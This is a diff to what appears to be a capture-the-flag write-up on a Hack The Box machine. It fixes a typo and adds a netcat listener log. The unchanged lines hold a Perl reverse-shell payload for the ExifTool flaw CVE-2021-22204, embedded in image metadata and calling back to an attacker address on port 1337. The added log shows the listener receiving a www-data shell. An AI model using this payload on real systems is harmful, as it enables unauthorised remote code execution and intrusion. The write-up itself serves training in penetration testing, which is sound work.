@@ -184,8 +184,21 @@ Color Components                : 3
 Y Cb Cr Sub Sampling            : YCbCr4:2:0 (2 2)
 ````
 
-* I`ve tried many reverse shell options w/out success, searching I found this one (https://github.com/AssassinUKG/CVE-2021-22204)
+* I've tried many reverse shell options w/out success, searching I found this one (https://github.com/AssassinUKG/CVE-2021-22204)
 
 ````
 (metadata "\c${use Socket;socket(S,PF_INET,SOCK_STREAM,getprotobyname('tcp'));if(connect(S,sockaddr_in(1337,inet_aton('10.10.14.221')))){open(STDIN,'>&S');open(STDOUT,'>&S');open(STDERR,'>&S');exec('/bin/sh -i');};};#")
 ````
+
+````
+root@kali:~# nc -nlvp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.221] from (UNKNOWN) [10.10.11.140] 54394
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+$ pwd   
+/var/www/dev01.artcorp.htb/metaview
+$ 
+````
+
